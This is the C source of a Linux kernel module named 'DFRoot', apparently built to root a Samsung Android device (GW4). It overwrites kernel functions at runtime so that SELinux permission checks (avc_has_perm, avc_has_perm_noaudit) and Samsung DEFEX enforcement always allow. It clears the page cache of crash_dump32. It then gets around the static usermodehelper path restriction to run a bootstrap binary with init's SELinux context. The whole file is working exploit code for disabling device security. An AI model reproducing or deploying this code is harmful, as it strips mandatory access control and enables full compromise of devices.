#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM — GW4");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);

static insn_patch_t insn_patch_text;

static __nocfi int patch_fn_ret_zero(void *fn)
{
    void *addrs[3];
    u32 insns[3];
    int ret;

    addrs[0] = fn;
    addrs[1] = (u8 *)fn + 4;
    addrs[2] = (u8 *)fn + 8;

    insns[0] = 0xD503245F;  // BTI C
    insns[1] = 0xD2800000;  // MOV x0, #0
    insns[2] = 0xD65F03C0;  // RET

    ret = insn_patch_text(addrs, insns, 3);
    if (ret)
        pr_warn("dfroot: patch failed at %px\n", fn);
    return ret;
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t  umh_setup;
    umh_exec_t   umh_exec;
    struct kprobe kln_kp;
    void *avc_fn, *avc_noaudit_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;

    static const char sh[] = "/system/bin/sh";
    static char cmd[512];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    snprintf(cmd, sizeof(cmd),
             "touch /dev/dfm0;"
             " echo -n 'u:r:init:s0' > /proc/self/attr/exec;"
             " exec /data/local/tmp/dfroot_bootstrap");

    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);
    pr_info("dfroot: kallsyms_lookup_name at %px\n", (void *)get_addr);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    /* Invalidate page cache for crash_dump32 (GW4: 32-bit userspace) */
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump32",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump32\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump32\n");
    }

    /*
     * CONFIG_SECURITY_SELINUX_DEVELOP=n on this kernel:
     * selinux_state has no enforcing field, WRITE_ONCE is a no-op.
     * ALWAYS patch avc_has_perm directly.
     */
    avc_fn = (void *)get_addr("avc_has_perm");
    if (!avc_fn) {
        pr_err("dfroot: avc_has_perm not found\n");
        return -EINVAL;
    }
    ret = patch_fn_ret_zero(avc_fn);
    if (ret)
        return ret;
    pr_info("dfroot: avc_has_perm patched\n");

    avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
    if (!avc_noaudit_fn) {
        pr_err("dfroot: avc_has_perm_noaudit not found\n");
        return -EINVAL;
    }
    ret = patch_fn_ret_zero(avc_noaudit_fn);
    if (ret)
        return ret;
    pr_info("dfroot: avc_has_perm_noaudit patched\n");

    /* Samsung DEFEX */
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn) {
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    } else {
        ret = patch_fn_ret_zero(defex_enforce_fn);
        if (ret)
            return ret;
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn) {
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    } else {
        ret = patch_fn_ret_zero(defex_umh_fn);
        if (ret)
            return ret;
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    pr_info("dfroot: all patches applied, launching bootstrap\n");

    /* UMH: run bootstrap from kernel space */
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup returned NULL\n");
        return -EINVAL;
    }
    /* bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to "" */
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_EXEC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);

    return -ENODEV;
}

static void __exit dfroot_exit(void) {}

module_init(dfroot_init);
module_exit(dfroot_exit);
